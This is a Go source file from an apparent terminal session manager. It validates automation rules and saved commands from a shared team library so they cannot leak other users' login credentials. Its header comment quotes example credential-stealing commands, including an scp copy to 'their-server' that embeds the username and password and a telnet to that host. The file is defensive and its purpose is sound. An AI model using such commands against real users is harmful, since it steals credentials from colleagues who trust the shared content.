// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 The YACM Authors. Additional terms under GPLv3 section 7: see NOTICE.md.

package core

import (
	"regexp"
	"strings"
	"time"

	"github.com/yacm-app/yacm/internal/store"
)

// Whoever can write to a team library could use <USER> and <PASS> to
// collect the logins of colleagues who link their own account to it:
// directly ("copy running-config scp://<USER>:<PASS>@their-server/x"), or by
// making the device ask ("telnet their-server", then answer "Password:"
// with <PASS>). So, in content from a library:
//
//   - saved commands never send <PASS>, and <USER> only as a line of its own;
//   - an automation rule sends <USER> or <PASS> only as its whole answer,
//     with Enter, at a prompt written as plain text that ends like a user
//     name or password prompt ("Password:", "Username:") and is matched as
//     plain text, and only while every earlier rule sent nothing but logins
//     and a few harmless commands (enable, su, terminal length …). A rule
//     that sends anything else ends that: later login answers are skipped;
//   - nothing sends control characters (Ctrl-A, Ctrl-P and the like could
//     move a typed password into a command line).

var (
	passPromptEnd = regexp.MustCompile(`(?i)(?:pass(?:word|code|phrase)?|assword|word|pin|secret|token|otp|code|lozinka|lozinku)\s*:\s*$`)
	userPromptEnd = regexp.MustCompile(`(?i)(?:user(?: ?name)?|sername|login|ogin|account|name|korisnik|korisničko ime)\s*:\s*$`)
	// Commands that keep a login chain harmless: they cannot open a
	// connection elsewhere.
	harmlessLead = regexp.MustCompile(`(?i)^(?:en|ena|enable(?: \d+)?|su(?: -)?|sudo (?:-i|-s|su(?: -)?)|term(?:inal)? (?:length|len|width) \d+|screen-length \d+(?: temporary)?|set cli screen-length \d+)$`)
	// Command line prompts a login answer must never be sent at.
	cliPrompts = []string{"router#", "router>", "R1(config)#", "core-sw1# ", "user@host:~$ ", "[root@host ~]# ", "<HUAWEI>", "admin@srx> ", "$ ", "# ", "> "}
)

// hasControl reports control characters other than line breaks and tabs
// (when lines is true) or any at all.
func hasControl(s string, lines bool) bool {
	return strings.IndexFunc(s, func(r rune) bool {
		if lines && (r == '\n' || r == '\r' || r == '\t') {
			return false
		}
		return r < 0x20 || r == 0x7f || (r >= 0x80 && r < 0xa0)
	}) >= 0
}

// teamCommandOK reports whether a saved command from a team library may be
// sent: no <PASS> at all, <USER> only as a line of its own, no control
// characters.
func teamCommandOK(text string) bool {
	if strings.Contains(text, "<PASS>") || hasControl(text, true) {
		return false
	}
	for _, line := range strings.Split(strings.ReplaceAll(text, "\r\n", "\n"), "\n") {
		if strings.Contains(line, "<USER>") && strings.TrimSpace(line) != "<USER>" {
			return false
		}
	}
	return true
}

func usesLogin(s string) bool { return strings.Contains(s, "<PASS>") || strings.Contains(s, "<USER>") }

// loginAnswerOK reports whether a rule that sends a login does so as the
// whole answer to a login prompt.
func loginAnswerOK(r store.ExpectRule) bool {
	if strings.TrimSpace(r.Expect) == "" || !r.Return {
		return false // no prompt to wait for, or typed without Enter into a command line
	}
	var end *regexp.Regexp
	switch r.Send {
	case "<PASS>":
		end = passPromptEnd
	case "<USER>":
		end = userPromptEnd
	default:
		return false
	}
	// Plain text that ends like a login prompt; buildRules matches it as
	// plain text, so a regular expression cannot reach the command line.
	text := loginPromptText(r.Expect)
	// A regular expression left after that would be matched as plain text
	// and never fire, so it is refused (and reported) instead.
	if !end.MatchString(text) || strings.ContainsAny(text, "#>$\\*+?|^[]{}") || hasControl(text, false) {
		return false
	}
	re := teamLoginPattern(r.Expect)
	for _, p := range cliPrompts {
		if re.MatchString(p) {
			return false
		}
	}
	return true
}

// teamLoginPattern is how a login answer from a library waits: for the
// prompt as plain text at the very end of the output (with the engine's
// Quiet wait, see teamLoginQuiet), so the same words in a banner, a log
// line or a file on screen do not count.
func teamLoginPattern(expectText string) *regexp.Regexp {
	return regexp.MustCompile(`(?i)` + regexp.QuoteMeta(loginPromptText(expectText)) + `[ \t]*$`)
}

var (
	// A trailing "\s*$" and the like: the end of the prompt, which
	// teamLoginPattern adds itself.
	promptTail = regexp.MustCompile(`(?:\\s[*+?]?|[ \t][*+?]?|\$)+$`)
	// [Pp], [Uu]: the case of one letter, which teamLoginPattern ignores.
	caseClass = regexp.MustCompile(`\[([A-Za-z])([A-Za-z])\]`)
)

// loginPromptText is the plain text of a login prompt as rules write it,
// also in the regular expression form YACM's own presets and the demo use
// ("[Pp]assword:\s*$" is "password:"). Anything else stays as it is and is
// matched as plain text.
func loginPromptText(expectText string) string {
	s := promptTail.ReplaceAllString(expectText, "")
	s = caseClass.ReplaceAllStringFunc(s, func(m string) string {
		if strings.EqualFold(m[1:2], m[2:3]) {
			return strings.ToLower(m[1:2])
		}
		return m
	})
	return s
}

const (
	// teamLoginQuiet is how long the output must stay quiet after a login
	// prompt from a library before the answer goes.
	teamLoginQuiet = 300 * time.Millisecond
	// teamRuleTimeout caps how long a library rule waits.
	teamRuleTimeout = 30
)

// teamRulesOK tells, for automation rules from a team library, which may
// run (inactive rules count as allowed: they never run).
func teamRulesOK(rules []store.ExpectRule) []bool {
	ok := make([]bool, len(rules))
	clean := true
	for i, r := range rules {
		if !r.Active {
			ok[i] = true
			continue
		}
		if hasControl(r.Send, false) {
			continue // never runs
		}
		if usesLogin(r.Send) {
			ok[i] = clean && loginAnswerOK(r)
			continue
		}
		ok[i] = true
		if s := strings.TrimSpace(r.Send); s != "" && !harmlessLead.MatchString(s) {
			clean = false
		}
	}
	return ok
}

// sanitizeTeamCopy keeps the automation and saved commands of a library
// session that is copied into your own sessions within the same limits:
// rules that would not run in the library are switched off, such saved
// commands are dropped. It returns how many it changed.
func sanitizeTeamCopy(ss *store.Session) int {
	if ss == nil {
		return 0
	}
	n := 0
	for i, ok := range teamRulesOK(ss.Expect) {
		if !ok {
			ss.Expect[i].Active = false
			n++
		}
	}
	kept := ss.Macros[:0]
	for _, m := range ss.Macros {
		if teamCommandOK(m.Text) {
			kept = append(kept, m)
		} else {
			n++
		}
	}
	ss.Macros = kept
	if usesLogin(ss.AntiIdleText) || hasControl(ss.AntiIdleText, false) {
		ss.AntiIdleText = ""
		n++
	}
	return n
}
